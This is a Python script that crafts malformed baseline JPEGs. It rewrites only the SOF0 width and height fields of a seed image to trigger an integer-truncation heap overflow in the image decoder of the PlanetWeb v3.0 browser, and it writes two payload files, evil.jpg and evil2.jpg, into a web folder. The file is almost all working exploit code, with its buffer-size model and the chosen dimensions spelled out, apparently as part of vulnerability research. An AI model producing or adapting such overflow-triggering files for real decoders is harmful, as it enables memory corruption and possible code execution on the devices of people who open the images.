#!/usr/bin/env python3
"""
Craft malicious baseline JPEGs that trigger the PlanetWeb v3.0 native libjpeg
heap overflow (LIBJPEG_readImage @0x8C150A92):

  buf = malloc( (output_width * output_components * output_height) & 0xFFFFFFFF + 8 )
  for row in range(output_height):
      jpeg_read_scanlines(&buf[row*stride], 1)   # writes TRUE stride bytes/row

The product is a 32-bit mul with NO overflow/dimension cap. By choosing W,H so
W*comp*H just exceeds 2^32, malloc gets a small (truncated) size while the row
loop writes ~full-size rows -> linear heap overflow with attacker pixel bytes.

We do NOT synthesize a JPEG from scratch (fiddly Huffman/quant). We take a real
baseline 3-component JPEG and rewrite ONLY the SOF0 height/width fields, leaving
its DQT/DHT/SOS/entropy data intact so the decoder runs normally and produces
rows (short entropy data -> "premature end" warning -> libjpeg pads & continues).
"""
import sys, struct
from pathlib import Path

ROOT = Path(__file__).resolve().parent

def find_sof0(d):
    """Return offset of the SOF0 (FFC0) marker payload (after the 2-byte length)."""
    i = 2  # skip SOI
    while i + 4 <= len(d):
        if d[i] != 0xFF:
            i += 1; continue
        m = d[i+1]
        if m in (0xD8, 0xD9) or 0xD0 <= m <= 0xD7:  # SOI/EOI/RSTn: no length
            i += 2; continue
        seg_len = struct.unpack(">H", d[i+2:i+4])[0]
        if m == 0xC0:                # SOF0 baseline
            return i + 4, seg_len
        i += 2 + seg_len
    raise SystemExit("no SOF0 found")

def patch_dims(src, W, H):
    d = bytearray(Path(src).read_bytes())
    off, _ = find_sof0(d)
    # SOF0 payload: [precision:1][height:2][width:2][Nf:1] ...
    prec = d[off]
    Nf   = d[off + 5]
    d[off+1:off+3] = struct.pack(">H", H)   # height (Y)
    d[off+3:off+5] = struct.pack(">H", W)   # width  (X)
    return bytes(d), prec, Nf

def model(W, comp, H):
    """Glue (LIBJPEG_readImage 0x8C150A92) buffer model:
       stride16 = (W*comp) & 0xFFFF   (mov.w truncation @0x8C150B50)
       malloc   = stride16 * H        (must succeed: keep < a few MB on a 16MB DC)
       per-row write = full W*comp bytes (read_scanlines) -> overflow past buffer =
       max((H-1)*stride16 + W*comp - stride16*H, 0) = (W*comp - stride16) when >0."""
    full = W * comp
    stride16 = full & 0xFFFF
    malloc = stride16 * H
    overflow = full - stride16            # bytes written past buffer end (indep. of H)
    return full, stride16, malloc, overflow

def main():
    seed = ROOT / "fuzz_seeds" / "seed1.jpg"
    if not seed.exists():
        seed = next((ROOT / "fuzz_seeds").glob("*.jpg"))
    outdir = ROOT / "www"; outdir.mkdir(exist_ok=True)

    # ---- evil.jpg: tiny stride16 => tiny malloc, 64KB overflow on the FIRST row ----
    # W*comp just over 0x10000 so stride16 is tiny (here 2) and malloc = 2*H bytes.
    W = 21846                       # *3 = 65538 = 0x10002 -> stride16 = 2
    H = 8
    full, s16, mal, ovf = model(W, 3, H)
    data, prec, Nf = patch_dims(seed, W, H)
    (outdir / "evil.jpg").write_bytes(data)
    print("[evil.jpg]   seed=%s prec=%d Nf=%d  W=%d H=%d comp=3" % (seed.name, prec, Nf, W, H))
    print("             full_stride=W*comp=%d (0x%X)  stride16=0x%X  malloc=%d bytes  overflow=%d (0x%X)"
          % (full, full, s16, mal, ovf, ovf))

    # ---- evil2.jpg: bigger 128KB overflow, malloc ~128KB (overflows from row 0) ----
    W2 = 0xFFFF                     # *3 = 196605 = 0x2FFFD -> stride16 = 0xFFFD, overflow 0x20000
    H2 = 2
    full2, s162, mal2, ovf2 = model(W2, 3, H2)
    data2, _, _ = patch_dims(seed, W2, H2)
    (outdir / "evil2.jpg").write_bytes(data2)
    print("[evil2.jpg]  W=%d H=%d comp=3  full_stride=%d stride16=0x%X malloc=%d overflow=%d (0x%X)"
          % (W2, H2, full2, s162, mal2, ovf2, ovf2))

if __name__ == "__main__":
    main()
